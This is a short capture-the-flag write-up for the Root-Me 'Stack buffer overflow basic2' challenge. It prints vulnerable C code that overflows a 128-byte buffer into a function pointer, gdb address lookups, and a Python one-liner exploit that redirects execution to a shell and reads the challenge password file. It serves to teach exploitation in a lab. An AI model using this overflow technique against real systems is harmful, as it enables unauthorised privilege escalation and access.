# ELF x86 - Stack buffer overflow basic2

- Problem: https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-2

We can see the source code as follows.
```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
void shell() {
    setreuid(geteuid(), geteuid());
    system("/bin/bash");
}
void sup() {
    printf("Hey dude ! Waaaaazzaaaaaaaa ?!\n");
}
void main()
{ 
    int var;
    void (*func)()=sup;
    char buf[128];
    fgets(buf,133,stdin);
    func();
}
```

We can overflow the buffer and change the address of the sup function to shell.
```
gef➤  p shell
$1 = {<text variable, no debug info>} 0x8048516 <shell>
gef➤  p sup
$2 = {<text variable, no debug info>} 0x8048559 <sup>
gef➤  p main
$3 = {<text variable, no debug info>} 0x8048584 <main>

app-systeme-ch15@challenge02:~$ cat <(python -c 'print "A" * 128 + "\x16\x85\x04\x08" + "\n"') - | ./ch15
id
uid=1215(app-systeme-ch15-cracked) gid=1115(app-systeme-ch15) groups=1115(app-systeme-ch15),100(users)
cat .passwd
```
